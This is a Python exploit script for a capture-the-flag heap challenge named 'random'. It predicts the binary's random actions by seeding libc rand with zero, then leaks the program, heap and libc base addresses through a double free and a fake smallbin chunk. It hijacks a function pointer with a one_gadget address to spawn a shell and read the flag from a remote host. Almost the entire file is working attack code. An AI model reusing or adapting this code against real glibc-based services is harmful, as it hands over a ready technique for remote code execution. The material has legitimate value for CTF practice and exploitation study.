# File: exp.py
# Author: raycp
# Date: 2019-06-11
# Description: exp for random

from pwn_debug import *
from ctypes import *

pdbg=""
p=''
membp=""
elf=""
libc=""

libc_fd=CDLL("/glibc/x64/2.27/lib/libc-2.27.so")
libc_fd.srand(0)
#io_file=IO_FILE_plus()
#io_file.show()

def get_action():
    rand_num=libc_fd.rand()%4
    return rand_num
def add(size,content,choice="N"):
    p.recvuntil("(Y/N)")
    p.sendline("Y")
    p.recvuntil("note:")
    p.sendline(str(size))
    p.recvuntil("note:")
    p.send(content)
    p.recvuntil("rrow?")
    p.sendline(choice)

def null_pad():
    p.recvuntil("(Y/N)")
    p.sendline("Y")
    p.recvuntil("note:")
    p.sendline("99")

def delete(idx):
    p.recvuntil("(Y/N)")
    p.sendline("Y")
    p.recvuntil("note:")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("(Y/N)")
    p.sendline("Y")
    p.recvuntil("note:\n")
    p.sendline(str(idx))


def edit(idx,content):
    p.recvuntil("(Y/N)")
    p.sendline("Y")
    p.recvuntil("note:\n")
    p.sendline(str(idx))
    p.recvuntil("note:")
    p.send(content)

def get_add():
    i=0
    while 1:
        action=get_action()
        print action
        if action==0:
            break
        i+=1
    print "times", i
    return i


def get_edit():
    i=0
    while 1:
        action=get_action()
        print action
        if action==1:
            break
        i+=1
    print "times", i


def get_view():
    i=0
    while 1:
        action=get_action()
        print action
        if action==3:
            break
        i+=1
    print "times", i

def get_delete():
    i=0
    while 1:
        action=get_action()
        print action
        if action==2:
            break
        i+=1
    print "times", i

def pwn(remote):
    
    #pdbg.bp(0x182B)
    # step 1 leak pro base by name
    p.recvuntil("name:")
    p.send('a'*0x8)
    p.recvuntil('a'*0x8)
    leak_pro=u64(p.recvuntil("?\n")[:-2].ljust(8,'\x00'))
    pro_base=leak_pro-0xb90
    log.info("leak pro base: 0x%x"%(pro_base))
    
    p.sendline("-1")

    for i in range(6):
        print get_action()
        p.recvuntil("(0~10)")
        p.sendline("1")
        null_pad()

    
    p.recvuntil("(0~10)")
    p.sendline("2")
    get_action()
    get_action()
    add(0x3f,'a\n','Y')
    null_pad()


    p.recvuntil("(0~10)")
    p.sendline("0")
    for i in range(0,2):
        null_pad()
    
    #pdbg.bp(0x11ac)
    for i in range(0,8):
        print get_action()
        p.recvuntil("(0~10)")
        p.sendline("1")
        null_pad()
    
    #pdbg.bp([0x134d,0x159b,0x1682])
    # double free here
    p.recvuntil("(0~10)")
    p.sendline("1")
    get_action()
    add(0x10,p64(0)+'\n')
     
    p.recvuntil("(0~10)")
    p.sendline("2")
    get_action()
    get_action()
    add(0x10,p64(0)+'\n')
    delete(1)

    #get_view()
    # leak heap address
    p.recvuntil("(0~10)")
    p.sendline("1")
    null_pad()
    get_action()
    
    
    p.recvuntil("(0~10)")
    p.sendline("1")
    get_action()
    view(2)
    leak_heap=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    heap_base=leak_heap-0x60
    log.info("leak heap base: 0x%x"%(heap_base))

    
    #get_edit()
    #pdbg.bp([0x134d])
    # build fake smallbin
    p.recvuntil("(0~10)")
    p.sendline("1")
    get_action()
    view_function_ptr=pro_base+0x1600
    payload=p64(0)+p64(0xa1)+p64(0)+p64(view_function_ptr)+p8(2)+'\n'
    add(0x27,payload)  #0x0e0

    #get_edit()
    p.recvuntil("(0~10)")
    p.sendline("7")
    for i in range(0,7):
        null_pad()
        get_action()
    
    puts_plt=pro_base+0x16ad
    #pdbg.bp([0x14e2,0x11ac,0x11ba])

    # delete small bin to unsorted bins
    p.recvuntil("(0~10)")
    p.sendline("2")
    get_action()
    get_action()
    payload=p64(heap_base+0xf0)+p64(view_function_ptr)+'\n'
    edit(2,payload)
    p.recvuntil("ote?(Y/N)")
    p.sendline("N")
    p.recvuntil("ote?(Y/N)")
    p.sendline("N")

    #get_delete()
    #pdbg.bp(0x159b)
    p.recvuntil("(0~10)")
    p.sendline("1")
    get_action()
    delete(1)

    #get_add()
    for i in range(0,5):
        p.recvuntil("(0~10)")
        p.sendline("1")
        null_pad()
        get_action()

    p.recvuntil("(0~10)")
    p.sendline("1")
    get_action()
    payload='a'*0x18
    add(0x18,payload)
    ## leak libc address
    #get_view()
    p.recvuntil("(0~10)")
    get_action()
    p.sendline("1")
    view(1)
    p.recvuntil("a"*0x18)
    leak_libc=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    #print hex(leak_libc)
    #libc_base=leak_libc-libc.symbols['main_arena']-0x58
    libc_base=leak_libc-0x3c4b78
    
    log.info("leak libc base: 0x%x"%(libc_base))
    rce=libc_base+0x45216 

    # hajack vtable function to rce
    #get_edit()
    #pdbg.bp([0x14e2,0x11ac,0x11ba])
    p.recvuntil("(0~10)")
    p.sendline("2")
    get_action()
    get_action()
    payload=p64(0)+p64(rce)+'\n'
    edit(2,payload)
    if remote:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        p.interactive()
        return flag
    else:
        p.interactive()
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
        p.interactive() 
        flag=None

    return flag



def run_exp(ip,port,remote):
    global pdbg
    global p
    global membp
    global elf
    global libc
    pdbg=pwn_debug("./random")

    pdbg.context.terminal=['tmux', 'splitw', '-h']
    #pdbg.context.log_level='debug'
    pdbg.local("./libc-2.23.so","/glibc/x64/2.23/lib/ld-2.23.so")
    pdbg.debug("2.23")
    pdbg.remote(ip, port,"./libc-2.23.so")
    
    
    if not remote:
        #p=pdbg.run("debug")
        p=pdbg.run("local")
        membp=pdbg.membp
    else:
        p=pdbg.run("remote")
    elf=pdbg.elf
    libc=pdbg.libc
    
    flag=pwn(remote)
   
    return flag

if __name__ == '__main__':
    #pwn()
    run_exp("192.168.213.117",9999,1)


